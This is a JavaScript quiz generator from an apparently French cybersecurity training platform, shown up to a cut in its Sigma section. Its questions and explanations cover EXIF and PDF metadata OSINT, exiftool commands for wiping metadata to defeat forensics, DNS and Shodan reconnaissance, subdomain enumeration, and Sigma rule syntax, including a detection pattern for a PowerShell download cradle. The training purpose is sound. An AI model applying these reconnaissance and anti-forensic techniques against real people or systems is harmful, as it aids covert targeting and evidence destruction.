// ═══════════════════════════════════════════════════════════════════
// tp-engine-osint-detect.js — CAS-IN TP delta v99
// 4 TP "moyens" : OSINT EXIF, OSINT DNS, Sigma Rules, C2 Frameworks
// Chargé APRÈS tp-engine.js (utilise rand, STATE, GENERATORS, helpers)
// ═══════════════════════════════════════════════════════════════════

(function () {
  'use strict';

  // ────────────────────────────────────────────────────────────────
  // HELPER : buildQCMCard (autonome — pas de dépendance v97/v98)
  // ────────────────────────────────────────────────────────────────
  function buildQCMCard(opts) {
    const id = opts.prefix;
    const div = document.createElement('div');
    div.className = 'ex-card';
    const choicesHTML = opts.choices.map((c, i) => `
      <button class="ex-choice" data-idx="${i}" id="ch-${id}-${i}">
        <span class="ex-choice-letter">${String.fromCharCode(65+i)}</span>
        <span class="ex-choice-text">${c.text}</span>
      </button>`).join('');

    div.innerHTML = `
      <div class="ex-header">
        <div class="ex-num" id="ex-num-${id}">${opts.icon || '🎯'}</div>
        <div class="ex-title">${opts.title}</div>
        <span class="ex-badge easy">${opts.badge || 'moyen'}</span>
      </div>
      <div class="ex-scenario">${opts.scenario}</div>
      <div class="ex-choices">${choicesHTML}</div>
      ${opts.hintFn ? `<div style="margin-top:.6rem"><button class="btn-hint" id="btn-hint-${id}">💡 Indice</button></div>` : ''}
      <div class="ex-feedback" id="ex-feedback-${id}"></div>
      <button class="btn-next" id="btn-next-${id}" onclick="newExercise()" style="display:none;margin-top:.5rem">Exercice suivant →</button>
    `;
    setTimeout(() => {
      opts.choices.forEach((c, i) => {
        const btn = div.querySelector(`#ch-${id}-${i}`);
        if (btn) btn.addEventListener('click', () => handleChoice(id, i, c.correct, c.explain, opts.choices));
      });
      if (opts.hintFn) {
        const hb = div.querySelector(`#btn-hint-${id}`);
        if (hb) hb.addEventListener('click', () => {
          if (typeof markHintUsed === 'function') markHintUsed();
          const fb = document.getElementById(`ex-feedback-${id}`);
          if (fb) { fb.className = 'ex-feedback correct'; fb.innerHTML = `💡 ${opts.hintFn()}`; }
        });
      }
    }, 50);
    return div;
  }

  function handleChoice(prefix, idx, isCorrect, explain, allChoices) {
    const fb = document.getElementById(`ex-feedback-${prefix}`);
    const choiceBtn = document.getElementById(`ch-${prefix}-${idx}`);
    const nextBtn = document.getElementById(`btn-next-${prefix}`);
    if (!fb || !choiceBtn) return;

    if (isCorrect) {
      choiceBtn.classList.add('correct');
      allChoices.forEach((_, i) => {
        const b = document.getElementById(`ch-${prefix}-${i}`);
        if (b) b.disabled = true;
      });
      fb.className = 'ex-feedback correct';
      fb.innerHTML = `✓ Correct ! ${explain}`;
      const card = choiceBtn.closest('.ex-card');
      if (card) card.classList.add('solved');
      const numEl = document.getElementById(`ex-num-${prefix}`);
      if (numEl) numEl.classList.add('solved');
      if (nextBtn) nextBtn.style.display = 'inline-flex';
      if (typeof STATE !== 'undefined' && !STATE.hintUsed && typeof incSolved === 'function') {
        incSolved(STATE.cat);
      }
    } else {
      choiceBtn.classList.add('wrong');
      choiceBtn.disabled = true;
      fb.className = 'ex-feedback wrong';
      fb.innerHTML = `✗ ${explain || 'Mauvaise réponse.'}`;
      if (typeof breakStreak === 'function') breakStreak();
    }
  }

  // ════════════════════════════════════════════════════════════════
  // TP 1 : OSINT EXIF & métadonnées
  // ════════════════════════════════════════════════════════════════

  function genEXIF() {
    const qType = rand(0, 6);
    const opts = { prefix: 'exif', icon: '🖼️', title: 'OSINT — Métadonnées EXIF', badge: 'osint' };

    if (qType === 0) {
      // Outil de référence
      const choices = [
        { text: '<code>exiftool</code> (Phil Harvey) — lit/écrit EXIF/IPTC/XMP sur 200+ formats', correct: true,
          explain: `<strong>exiftool</strong> est l'outil canonique de la communauté forensique/OSINT. Usage : <code>exiftool photo.jpg</code>. Lit aussi les métadonnées audio, vidéo, PDF, Office. Supporte la modification (anti-forensique) et les <em>tags</em> propriétaires (Canon, Nikon, Apple).` },
        { text: '<code>strings</code> sur le fichier', correct: false,
          explain: `<code>strings</code> peut révéler des chaînes ASCII (notamment des noms de logiciel "Adobe Photoshop"), mais ne parse pas les structures EXIF binaires — beaucoup de métadonnées manquées.` },
        { text: '<code>file</code> commande Unix', correct: false,
          explain: `<code>file image.jpg</code> identifie le format mais ne lit pas les métadonnées détaillées (auteur, GPS, etc.).` },
        { text: '<code>md5sum</code>', correct: false,
          explain: `Calcule un hash, n'extrait pas les métadonnées.` },
      ].sort(() => Math.random() - 0.5);
      return buildQCMCard({
        ...opts,
        scenario: `Quel outil CLI est <strong>la référence</strong> pour extraire les métadonnées EXIF d'images ?`,
        choices,
        hintFn: () => `Phil Harvey développe exiftool depuis 2003. Open source, multi-plateforme, supporte 200+ formats. Alternatives GUI : ExifReader, PhotoStudio, Jeffrey's EXIF viewer (web).`
      });
    }

    if (qType === 1) {
      // GPS : format conversion
      const lat = (45 + Math.random() * 3).toFixed(4);  // 45-48 = Suisse/France
      const lon = (6 + Math.random() * 4).toFixed(4);   // 6-10
      const degLat = parseFloat(lat);
      const dmsLat = `${Math.floor(degLat)}° ${Math.floor((degLat % 1) * 60)}' ${(((degLat % 1) * 60) % 1 * 60).toFixed(2)}"`;
      const correct = `${dmsLat} N`;
      const choices = [
        { text: correct, correct: true,
          explain: `Conversion décimal → DMS : partie entière = degrés, multiplier décimal par 60 = minutes, reste × 60 = secondes. <strong>${lat}</strong> N (décimal) ≈ <strong>${correct}</strong>. GPSLatitudeRef = "N" (Nord) car valeur positive.` },
        { text: `${lat}° ${Math.floor(degLat / 60)}' 0" N`, correct: false,
          explain: `Mauvaise conversion : on prend la partie entière en degrés, pas une division par 60.` },
        { text: `${dmsLat} S`, correct: false,
          explain: `S = Sud (latitude négative). Notre coordonnée est positive donc N (Nord).` },
        { text: `${lat}° N (Centesimal sur 100)`, correct: false,
          explain: `Le format DMS utilise base 60 (60 minutes par degré, 60 secondes par minute), pas 100. La forme décimale ${lat}° existe mais n'est pas l'écriture DMS demandée.` },
      ].sort(() => Math.random() - 0.5);
      return buildQCMCard({
        ...opts,
        scenario: `Une photo a une latitude EXIF de <strong>${lat}°</strong> (décimal). Quelle est la représentation <strong>DMS</strong> (degrés/minutes/secondes) ?`,
        choices,
        hintFn: () => `Décimal → DMS : entier = degrés. (décimal × 60) → minutes. ((reste × 60) × 60) → secondes. Hémisphère : N/S pour latitude (positif = N), E/W pour longitude (positif = E).`
      });
    }

    if (qType === 2) {
      // Plateforme qui ne strip pas l'EXIF
      const choices = [
        { text: 'Flickr (par défaut, conserve l\'EXIF complet)', correct: true,
          explain: `<strong>Flickr</strong> est connu pour conserver l'EXIF complet par défaut (utile pour les photographes pros). À l'inverse : <strong>Facebook, Instagram, Twitter/X, WhatsApp</strong> strippent généralement EXIF (GPS, modèle d'appareil) à l'upload. Toujours vérifier en téléchargeant l'image et en passant exiftool — politique peut changer.` },
        { text: 'Facebook', correct: false,
          explain: `Facebook strippe les EXIF à l'upload depuis 2014 (mais ajoute son propre tracking dans le fichier).` },
        { text: 'Instagram', correct: false,
          explain: `Instagram strippe également l'EXIF à l'upload.` },
        { text: 'WhatsApp', correct: false,
          explain: `WhatsApp strippe l'EXIF lors de l'envoi de photos (compression + sanitisation).` },
      ].sort(() => Math.random() - 0.5);
      return buildQCMCard({
        ...opts,
        scenario: `Quelle plateforme conserve traditionnellement les <strong>métadonnées EXIF complètes</strong> à l'upload (utile pour OSINT) ?`,
        choices,
        hintFn: () => `Politique des plateformes en 2026 : Flickr garde EXIF (photographes pros). FB/Insta/Twitter/WhatsApp strippent. Toujours tester en téléchargeant et passant exiftool — les politiques changent.`
      });
    }

    if (qType === 3) {
      // Champs OSINT-utiles dans EXIF
      const choices = [
        { text: '<strong>Make/Model</strong> (appareil), <strong>DateTimeOriginal</strong> (date de prise), <strong>GPSLatitude/Longitude</strong>, <strong>Software</strong> (logiciel éditeur)', correct: true,
          explain: `Les champs <strong>les plus précieux en OSINT</strong> : <code>Make/Model</code> (ex: "Canon EOS 5D Mark IV" → marque + modèle pour pivot), <code>DateTimeOriginal</code> vs <code>ModifyDate</code> (incohérence = montage), <code>GPSLatitude/Longitude/GPSAltitude</code> (géolocalisation précise), <code>Software</code> ("Adobe Photoshop 24.0" → édition révèle un montage). Aussi : <code>SerialNumber</code> (pivot unique sur le boîtier !).` },
        { text: 'Uniquement le hash MD5 du fichier', correct: false,
          explain: `Le hash ne fait pas partie de l'EXIF, c'est calculé par l'outil forensique.` },
        { text: 'Le nom de l\'utilisateur Windows ayant édité', correct: false,
          explain: `Pas dans l'EXIF. Existe dans les métadonnées Office/PDF (champ Author), pas dans EXIF d'image.` },
        { text: 'L\'adresse IP de l\'appareil photo', correct: false,
          explain: `Un appareil photo n'a pas d'IP (sauf appareils connectés Wi-Fi récents, et même alors l'IP n'est pas dans l'EXIF).` },
      ].sort(() => Math.random() - 0.5);
      return buildQCMCard({
        ...opts,
        scenario: `Quels champs EXIF sont les plus <strong>OSINT-utiles</strong> ?`,
        choices,
        hintFn: () => `Top 5 : Make/Model (appareil), DateTimeOriginal (prise), GPSLatitude/Longitude (géolocalisation), Software (logiciel éditeur), SerialNumber (pivot unique boîtier). Bonus : LensInfo, FocalLength, ExposureTime.`
      });
    }

    if (qType === 4) {
      // Anti-forensique EXIF
      const choices = [
        { text: '<code>exiftool -all= image.jpg</code> — supprime toutes les métadonnées', correct: true,
          explain: `<code>exiftool -all= file</code> efface tous les tags. <code>-overwrite_original</code> pour ne pas créer de backup. Variantes utiles : <code>exiftool -gps:all= file</code> (GPS seulement), <code>exiftool -tagsfromfile clean.jpg source.jpg</code> (copier les tags d'un fichier "propre"). Attention : ne supprime PAS les données stéganographiques cachées dans les pixels.` },
        { text: '<code>chmod 000 image.jpg</code>', correct: false,
          explain: `chmod change les permissions du fichier, mais ne touche pas son contenu (EXIF reste).` },
        { text: '<code>cat image.jpg | grep -v EXIF</code>', correct: false,
          explain: `grep ne fonctionne pas sur du binaire structuré — les blocs EXIF survivront. Approche inadaptée.` },
        { text: 'Renommer en <code>.txt</code>', correct: false,
          explain: `Renommer n'altère pas le contenu. Le JPEG reste un JPEG avec son EXIF.` },
      ].sort(() => Math.random() - 0.5);
      return buildQCMCard({
        ...opts,
        scenario: `Comment <strong>supprimer toutes les métadonnées EXIF</strong> d'une image (anti-forensique) ?`,
        choices,
        hintFn: () => `exiftool est aussi un outil d'écriture/effacement. <code>-all=</code> efface tous les tags. <code>-overwrite_original</code> pour pas de backup. Idéal pour anti-forensique (mais ne nettoie pas la stéganographie).`
      });
    }

    if (qType === 5) {
      // PDF metadata
      const choices = [
        { text: '<strong>XMP</strong> (Adobe), <strong>DocInfo</strong> (Author, CreationDate, Producer), <strong>Creator Tool</strong>', correct: true,
          explain: `Les PDF embarquent <strong>XMP</strong> (Adobe Extensible Metadata Platform, basé sur RDF/XML) et un dictionnaire <strong>DocInfo</strong> avec : <code>Author</code> (souvent le nom d'utilisateur OS au moment de la création — fuite classique !), <code>CreationDate</code>, <code>ModDate</code>, <code>Producer</code> (logiciel : Microsoft Word, Adobe Acrobat), <code>Creator</code>. Exemple OSINT historique : doc "iraq dodgy dossier" 2003 → champ Author révéla 4 noms britanniques (Cabinet Office).` },
        { text: 'Pas de métadonnées dans les PDF', correct: false,
          explain: `Faux. Les PDF ont des métadonnées riches (XMP + DocInfo), souvent peu nettoyées.` },
        { text: 'EXIF identique aux JPEG', correct: false,
          explain: `Les PDF n'utilisent pas EXIF (qui est spécifique aux images). Ils ont XMP et DocInfo.` },
        { text: 'Uniquement la taille du fichier', correct: false,
          explain: `Bien plus que ça : auteur, dates, logiciel, parfois historique d'édition.` },
      ].sort(() => Math.random() - 0.5);
      return buildQCMCard({
        ...opts,
        scenario: `Quelles métadonnées sont embarquées dans un <strong>PDF</strong> (souvent oubliées avant publication) ?`,
        choices,
        hintFn: () => `PDF = XMP (Adobe, XML/RDF) + DocInfo (Author, CreationDate, Producer, Creator). Author = souvent le nom d'utilisateur OS du créateur. Lire : <code>exiftool fichier.pdf</code> ou <code>pdfinfo</code> (poppler).`
      });
    }

    // qType === 6 : timestamp mismatch
    const choices = [
      { text: 'Comparer <code>DateTimeOriginal</code> (prise de vue) vs <code>ModifyDate</code> vs <code>FileModifyDate</code> (FS) — incohérence = édition postérieure', correct: true,
        explain: `<strong>3 timestamps</strong> à confronter :<br>• <code>DateTimeOriginal</code> = quand la photo a été prise (EXIF, fixé par l'appareil)<br>• <code>ModifyDate</code> (EXIF) = dernière modification du fichier image<br>• <code>FileModifyDate</code> = timestamp filesystem (peut être modifié par <code>touch</code>)<br>Si <code>ModifyDate</code> > <code>DateTimeOriginal</code> → la photo a été éditée après la prise. Si <code>FileModifyDate</code> < <code>DateTimeOriginal</code> → potentiel timestomping.` },
      { text: 'Lire le hash MD5 et comparer avec une base', correct: false,
        explain: `Le hash identifie le fichier exact mais ne révèle pas une édition. Pour détecter des modifs, comparer les timestamps internes.` },
      { text: 'Faire un OCR sur l\'image', correct: false,
        explain: `OCR extrait du texte des pixels — sans rapport avec la détection d'édition par métadonnées.` },
      { text: 'Demander à ChatGPT', correct: false,
        explain: `Une IA peut suggérer des incohérences visuelles, mais l'analyse forensique demande des métadonnées concrètes (exiftool).` },
    ].sort(() => Math.random() - 0.5);
    return buildQCMCard({
      ...opts,
      scenario: `Comment <strong>détecter qu'une photo a été éditée</strong> après la prise (via EXIF) ?`,
      choices,
      hintFn: () => `Comparer 3 timestamps : DateTimeOriginal (prise), ModifyDate (EXIF édition), FileModifyDate (FS). Logiciel éditeur dans <code>Software</code> ("Adobe Photoshop...") est aussi un indicateur immédiat.`
    });
  }

  // ════════════════════════════════════════════════════════════════
  // TP 2 : OSINT DNS & Infrastructure
  // ════════════════════════════════════════════════════════════════

  function genOSINTDNS() {
    const qType = rand(0, 6);
    const opts = { prefix: 'osintdns', icon: '🌐', title: 'OSINT — Infrastructure DNS', badge: 'osint' };

    if (qType === 0) {
      // Type d'enregistrement DNS
      const records = [
        { type: 'A', purpose: 'Résolution nom → adresse IPv4' },
        { type: 'AAAA', purpose: 'Résolution nom → adresse IPv6' },
        { type: 'MX', purpose: 'Serveur de messagerie (Mail eXchange) du domaine' },
        { type: 'TXT', purpose: 'Texte libre (SPF, DKIM, verification, DNS tunneling)' },
        { type: 'NS', purpose: 'Serveurs DNS faisant autorité sur la zone' },
        { type: 'CNAME', purpose: 'Alias (Canonical Name) pointant vers un autre nom' },
        { type: 'SOA', purpose: 'Start of Authority — admin et version de la zone' },
        { type: 'PTR', purpose: 'Reverse DNS — IP → nom' },
      ];
      const target = records[rand(0, records.length - 1)];
      const others = records.filter(r => r !== target);
      const distractors = [];
      while (distractors.length < 3) {
        distractors.push(others.splice(rand(0, others.length - 1), 1)[0]);
      }
      const choices = [
        { text: target.purpose, correct: true,
          explain: `<strong>${target.type}</strong> : ${target.purpose}. Requête : <code>dig ${target.type} domain.tld</code>.` },
        ...distractors.map(d => ({
          text: d.purpose, correct: false,
          explain: `Ça c'est <strong>${d.type}</strong>, pas ${target.type}.`
        }))
      ].sort(() => Math.random() - 0.5);
      return buildQCMCard({
        ...opts,
        scenario: `À quoi sert un enregistrement DNS de type <strong>${target.type}</strong> ?`,
        choices,
        hintFn: () => `Types DNS courants : A (IPv4), AAAA (IPv6), MX (mail), TXT (libre/SPF/DKIM), NS (autorité), CNAME (alias), SOA (zone admin), PTR (reverse).`
      });
    }

    if (qType === 1) {
      // WHOIS depuis RGPD
      const choices = [
        { text: 'Anonymisés/masqués pour les TLD européens depuis le RGPD (mai 2018)', correct: true,
          explain: `Depuis le <strong>RGPD (mai 2018)</strong>, les registrars européens (et beaucoup d'autres par alignement) masquent les <code>Registrant Name</code>, <code>Email</code>, <code>Address</code> par "REDACTED FOR PRIVACY" ou similaire. Pivots toujours disponibles : <strong>dates de création/expiration, registrar, name servers, statut DNSSEC</strong>. Bases payantes avec historique (whoisxmlapi, DomainTools) peuvent montrer les anciens contacts pré-RGPD.` },
        { text: 'Toujours accessibles publiquement dans tous les pays', correct: false,
          explain: `Avant RGPD oui, mais 2018+ : masqués pour les registrars EU et beaucoup d'autres (politique ICANN).` },
        { text: 'Supprimés définitivement', correct: false,
          explain: `Les données existent toujours côté registrar — elles sont juste cachées du public WHOIS. Accessibles via procédure judiciaire.` },
        { text: 'Cryptés en SHA-256', correct: false,
          explain: `Pas de cryptage : juste masquage textuel ("REDACTED FOR PRIVACY").` },
      ].sort(() => Math.random() - 0.5);
      return buildQCMCard({
        ...opts,
        scenario: `Les <strong>contacts dans une réponse WHOIS</strong> sont-ils accessibles en 2026 ?`,
        choices,
        hintFn: () => `RGPD (mai 2018) → registrars EU masquent Registrant Name/Email. Encore visibles : dates, registrar, name servers, DNSSEC. Historique pré-RGPD parfois disponible chez whoisxmlapi/DomainTools (payant).`
      });
    }

    if (qType === 2) {
      // Shodan
      const choices = [
        { text: '<strong>Shodan</strong> (John Matherly, 2009) — moteur de recherche d\'appareils connectés à Internet', correct: true,
          explain: `<strong>Shodan</strong> scanne en continu Internet sur les ports communs (80, 443, 22, 3389, 5900 VNC, 502 Modbus, 102 Siemens S7, 161 SNMP, etc.) et indexe les <em>bannières</em>. Recherches : <code>port:5900 country:CH</code> (VNC en Suisse), <code>"Server: Apache" org:"Bank"</code>, <code>cert.subject.cn:example.com</code> (par certificat TLS). Concurrent direct : <strong>Censys</strong> (Université Michigan, 2015), plus orienté certificats TLS.` },
        { text: 'Google Maps', correct: false,
          explain: `Google Maps fait de la cartographie géographique, pas du scan réseau.` },
        { text: 'archive.org', correct: false,
          explain: `Wayback Machine archive les pages web, pas les bannières de services exposés.` },
        { text: 'GitHub Search', correct: false,
          explain: `GitHub indexe du code, pas des appareils Internet.` },
      ].sort(() => Math.random() - 0.5);
      return buildQCMCard({
        ...opts,
        scenario: `Quel service en ligne <strong>cartographie les appareils exposés sur Internet</strong> par scan de ports + banner grabbing ?`,
        choices,
        hintFn: () => `Shodan (John Matherly, 2009) et Censys (Michigan, 2015) sont les deux références. Recherche par port, banner, OS, organisation, certificat TLS, géolocalisation IP.`
      });
    }

    if (qType === 3) {
      // Subdomain enumeration
      const choices = [
        { text: '<code>amass</code>, <code>subfinder</code>, <code>assetfinder</code> — collecte passive (sources OSINT) + active (DNS bruteforce)', correct: true,
          explain: `Outils modernes :<br>• <strong>amass</strong> (OWASP) — combine 50+ sources passives + bruteforce + ASN<br>• <strong>subfinder</strong> (ProjectDiscovery) — rapide, passif<br>• <strong>assetfinder</strong> (tomnomnom) — simple, plusieurs sources<br>Sources passives : Certificate Transparency logs (crt.sh, Censys), recherches Google/Bing, VirusTotal, archives, etc. Active : bruteforce de noms (dictionnaires comme <code>SecLists</code>).` },
        { text: '<code>ping</code> sur chaque sous-domaine possible', correct: false,
          explain: `Approche naïve qui ne scale pas et rate les sous-domaines non-pingables. Les outils dédiés utilisent des sources OSINT (CT logs, etc.).` },
        { text: '<code>nslookup -type=SUBDOMAIN</code>', correct: false,
          explain: `Type DNS <code>SUBDOMAIN</code> n'existe pas. nslookup ne fait pas d'énumération.` },
        { text: 'Recherche manuelle Google domaine par domaine', correct: false,
          explain: `Possible (avec dorks comme <code>site:*.target.com</code>) mais incomplet face aux outils automatisés.` },
      ].sort(() => Math.random() - 0.5);
      return buildQCMCard({
        ...opts,
        scenario: `Quels outils permettent d'<strong>énumérer les sous-domaines</strong> d'une cible en OSINT ?`,
        choices,
        hintFn: () => `Modernes : amass (OWASP), subfinder (ProjectDiscovery), assetfinder. Sources passives : Certificate Transparency (crt.sh, Censys), VirusTotal, archives. Active : bruteforce DNS avec wordlists (SecLists).`
      });
    }

    if (qType === 4) {
      // Reverse DNS et PTR
      const choices = [
        { text: 'Requête DNS de type <strong>PTR</strong> dans la zone <code>in-addr.arpa</code> (IPv4) ou <code>ip6.arpa</code> (IPv6)', correct: true,
          explain: `<strong>Reverse DNS</strong> : IP → nom. Mécanisme : zone spéciale <code>X.Y.Z.W.in-addr.arpa</code> (octets <em>inversés</em>). Exemple : pour <code>192.0.2.1</code>, on requête <code>1.2.0.192.in-addr.arpa</code> type PTR. CLI : <code>dig -x 192.0.2.1</code>, <code>nslookup 192.0.2.1</code>, <code>host 192.0.2.1</code>. Souvent pas configuré (PTR retourne NXDOMAIN).` },
        { text: 'Requête DNS de type A inversée', correct: false,
          explain: `Pas de type A "inversé". Le reverse DNS utilise PTR dans une zone arpa.` },
        { text: 'Calcul mathématique sur l\'IP', correct: false,
          explain: `Pas un calcul : c'est une requête DNS comme une autre (PTR dans la zone in-addr.arpa).` },
        { text: 'Lecture de la table ARP locale', correct: false,
          explain: `ARP fait la correspondance MAC ↔ IP sur réseau local, pas IP → nom.` },
      ].sort(() => Math.random() - 0.5);
      return buildQCMCard({
        ...opts,
        scenario: `Comment fonctionne le <strong>reverse DNS</strong> (résoudre IP → nom) ?`,
        choices,
        hintFn: () => `Requête PTR dans la zone in-addr.arpa (IPv4) ou ip6.arpa (IPv6). Octets inversés. CLI : <code>dig -x 8.8.8.8</code> → "dns.google.". Souvent pas configuré sur des IPs résidentielles ou hébergeurs cheap.`
      });
    }

    if (qType === 5) {
      // DNSSEC
      const choices = [
        { text: 'Une <strong>chaîne de signatures cryptographiques</strong> qui authentifie les réponses DNS et empêche le DNS spoofing', correct: true,
          explain: `<strong>DNSSEC</strong> (DNS Security Extensions, RFC 4033-4035) ajoute des signatures aux enregistrements DNS :<br>• <strong>RRSIG</strong> = signature d'un RRset<br>• <strong>DNSKEY</strong> = clé publique de la zone<br>• <strong>DS</strong> = digest de la DNSKEY du fils, signé par le parent<br>• <strong>NSEC/NSEC3</strong> = preuve de non-existence<br>Chaîne de confiance depuis la racine signée (.). Vérification : <code>dig +dnssec example.com</code>. Sans DNSSEC : DNS cache poisoning trivial.` },
        { text: 'Le chiffrement TLS du DNS (DoH/DoT)', correct: false,
          explain: `Faux ! DNSSEC = authentification (signatures), pas chiffrement. Le chiffrement DNS = <strong>DoH</strong> (DNS over HTTPS, RFC 8484) ou <strong>DoT</strong> (DNS over TLS, RFC 7858) — concepts distincts mais complémentaires.` },
        { text: 'Un pare-feu DNS payant', correct: false,
          explain: `DNSSEC est un standard ouvert, pas un produit commercial.` },
        { text: 'L\'obfuscation des requêtes DNS', correct: false,
          explain: `DNSSEC n'obfusque rien — les requêtes restent en clair (sauf si combiné à DoH/DoT). Authentification, pas masquage.` },
      ].sort(() => Math.random() - 0.5);
      return buildQCMCard({
        ...opts,
        scenario: `Qu'est-ce que <strong>DNSSEC</strong> ?`,
        choices,
        hintFn: () => `DNSSEC = signatures (RRSIG, DNSKEY, DS, NSEC). Authentification, pas chiffrement. Distinct de DoH/DoT (chiffrement). Racine . signée en 2010. Chaîne de confiance jusqu'à la racine.`
      });
    }

    // qType === 6 : Certificate Transparency
    const choices = [
      { text: '<strong>Certificate Transparency</strong> (RFC 6962) — logs publics de tous les certs TLS émis, sources : crt.sh, Censys', correct: true,
        explain: `<strong>CT</strong> (Certificate Transparency) impose aux CA publiques de logger chaque certificat émis dans des <em>logs append-only</em> publics. Depuis Chrome 68 (2018), un cert sans <em>SCT</em> (Signed Certificate Timestamp) est marqué "Not Secure". OSINT : <strong>crt.sh</strong> permet la recherche par nom de domaine et révèle TOUS les sous-domaines pour lesquels la cible a obtenu un cert (incluant ceux non publics dans le DNS) → mine d'or pour la reco.` },
      { text: 'Un cache local Windows', correct: false,
        explain: `Le cache local Windows liste les certs validés sur la machine, pas tous les certs émis dans le monde.` },
      { text: 'La base de Google Search', correct: false,
        explain: `Google indexe les pages web, pas les certificats émis par les CA.` },
      { text: 'Le keychain macOS', correct: false,
        explain: `Le keychain stocke les certs locaux de la machine, sans rapport avec CT.` },
    ].sort(() => Math.random() - 0.5);
    return buildQCMCard({
      ...opts,
      scenario: `Quelle source OSINT permet de <strong>découvrir tous les sous-domaines</strong> pour lesquels une cible a obtenu un certificat TLS ?`,
      choices,
      hintFn: () => `Certificate Transparency (CT, RFC 6962). Logs append-only publics. crt.sh permet la recherche par nom : <code>crt.sh/?q=example.com</code> → tous les certs émis incluant sous-domaines techniques (dev.*, staging.*, internal.*). Censys et Google CT logs aussi.`
    });
  }

  // ════════════════════════════════════════════════════════════════
  // TP 3 : Sigma Rules
  // ════════════════════════════════════════════════════════════════

  function genSigma() {
    const qType = rand(0, 6);
    const opts = { prefix: 'sigma', icon: '🛡️', title: 'Sigma Rules & Detection Engineering', badge: 'detect' };

    if (qType === 0) {
      // Format Sigma
      const choices = [
        { text: '<strong>YAML</strong> structuré, indépendant du SIEM cible', correct: true,
          explain: `Sigma est écrit en <strong>YAML</strong> (clés/valeurs hiérarchiques). Conçu par <strong>Florian Roth</strong> (Nextron Systems) en 2017. Une règle Sigma se <em>compile</em> vers le langage natif du SIEM cible : Splunk SPL, Elastic ESQL/EQL, Microsoft Sentinel KQL, QRadar AQL, etc. Repo officiel : <code>SigmaHQ/sigma</code> sur GitHub (3000+ règles communautaires).` },
        { text: 'JSON Schema', correct: false,
          explain: `Faux. Sigma utilise YAML (qui peut être converti en JSON mais le format canonique est YAML).` },
        { text: 'XML', correct: false,
          explain: `Pas XML. YAML.` },
        { text: 'Binaire propriétaire', correct: false,
          explain: `Open source, format texte (YAML) lisible.` },
      ].sort(() => Math.random() - 0.5);
      return buildQCMCard({
        ...opts,
        scenario: `Sous quel <strong>format</strong> les règles Sigma sont-elles écrites ?`,
        choices,
        hintFn: () => `YAML structuré (Florian Roth, 2017, SigmaHQ). Indépendant SIEM : compilé vers SPL/EQL/KQL/AQL avec sigma-cli. Lisible humain, versionnable Git.`
      });
    }

    if (qType === 1) {
      // Bloc detection / condition
      const choices = [
        { text: 'Des <strong>selections</strong> (filtrant des champs) combinées par une <strong>condition</strong> booléenne', correct: true,
          explain: `Structure d'un bloc detection :<br><pre>detection:
  selection_1:
    EventID: 4688
    Image|endswith: '\\powershell.exe'
  filter:
    User: 'NT AUTHORITY\\SYSTEM'
  condition: selection_1 and not filter</pre>Les <em>selections</em> matchent un ensemble de critères. Le <code>condition:</code> les combine avec <code>and</code>, <code>or</code>, <code>not</code>, <code>1 of</code>, <code>all of</code>.` },
        { text: 'Le hash SHA-256 du malware à détecter', correct: false,
          explain: `Les hashes peuvent être dans une selection (<code>Hashes|contains: ...</code>) mais le bloc detection est structurel, pas un hash isolé.` },
        { text: 'L\'IP du C2', correct: false,
          explain: `Peut figurer dans une selection (<code>DestinationIp: ...</code>) mais ce n'est pas le contenu structurel du bloc.` },
        { text: 'Le nom de l\'auteur', correct: false,
          explain: `L'auteur est dans le champ métadonnée <code>author:</code>, pas dans <code>detection:</code>.` },
      ].sort(() => Math.random() - 0.5);
      return buildQCMCard({
        ...opts,
        scenario: `Que contient le bloc <code>detection:</code> d'une règle Sigma ?`,
        choices,
        hintFn: () => `<code>detection:</code> contient des <em>selections</em> (filtres sur champs : EventID, Image, CommandLine, User, etc.) combinées par <code>condition:</code> avec opérateurs and/or/not.`
      });
    }

    if (qType === 2) {
      // Modifiers
      const choices = [
        { text: '<strong>|contains</strong>, <strong>|endswith</strong>, <strong>|startswith</strong>, <strong>|re</strong>, <strong>|all</strong>, <strong>|base64</strong>', correct: true,
          explain: `Modificateurs Sigma (suffixes après <code>|</code>) :<br>• <code>|contains</code> : substring<br>• <code>|startswith</code>, <code>|endswith</code> : prefixe/suffixe<br>• <code>|re</code> : regex<br>• <code>|all</code> : tous les éléments de la liste doivent matcher (au lieu de "n'importe lequel" par défaut)<br>• <code>|base64</code> : décode base64 avant comparaison<br>• <code>|cidr</code> : match d'IP dans une plage CIDR<br>Exemple : <code>CommandLine|contains: 'iex(New-Object'</code>.` },
        { text: '<code>like</code>, <code>match</code>, <code>has</code> uniquement', correct: false,
          explain: `Pas la syntaxe Sigma. Les modificateurs commencent par <code>|</code>.` },
        { text: 'Aucun, on doit toujours faire match exact', correct: false,
          explain: `Faux. Les modifiers (<code>|contains</code> etc.) sont une fonctionnalité clé qui rend Sigma expressif.` },
        { text: 'Uniquement <code>==</code> et <code>!=</code>', correct: false,
          explain: `Sigma utilise YAML, donc <code>:</code> pour la clé-valeur. Pas d'opérateurs <code>==/!=</code> directs.` },
      ].sort(() => Math.random() - 0.5);
      return buildQCMCard({
        ...opts,
        scenario: `Quels <strong>modificateurs</strong> (modifiers) Sigma permettent des matches non-exacts ?`,
        choices,
        hintFn: () => `Modifiers Sigma : <code>|contains</code>, <code>|startswith</code>, <code>|endswith</code>, <code>|re</code> (regex), <code>|all</code> (tous au lieu de n'importe lequel), <code>|base64</code>, <code>|cidr</code>. Syntaxe : <code>Champ|modifier: valeur</code>.`
      });
    }

    if (qType === 3) {
      // Level
      const choices = [
        { text: '<code>informational</code>, <code>low</code>, <code>medium</code>, <code>high</code>, <code>critical</code>', correct: true,
          explain: `Le champ <code>level:</code> d'une règle Sigma utilise 5 niveaux : <strong>informational</strong> (observation, peu actionable), <strong>low</strong>, <strong>medium</strong>, <strong>high</strong>, <strong>critical</strong>. Utilisé par le SIEM pour prioriser les alertes. Bonne pratique : ne pas surutiliser "critical" (réservé à du clairement malveillant : Mimikatz, exécution de commande dump SAM, etc.).` },
        { text: '<code>1</code>, <code>2</code>, <code>3</code>, <code>4</code>, <code>5</code>', correct: false,
          explain: `Sigma utilise des chaînes verbales (informational, low, medium, high, critical), pas des entiers.` },
        { text: '<code>P1</code> à <code>P5</code>', correct: false,
          explain: `Pas la convention Sigma. Certains SIEM internes utilisent P1-P5, mais Sigma utilise les 5 niveaux verbaux.` },
        { text: '<code>red</code>, <code>orange</code>, <code>yellow</code>, <code>green</code>', correct: false,
          explain: `Couleurs utilisées dans certains dashboards, mais pas le champ <code>level:</code> de Sigma.` },
      ].sort(() => Math.random() - 0.5);
      return buildQCMCard({
        ...opts,
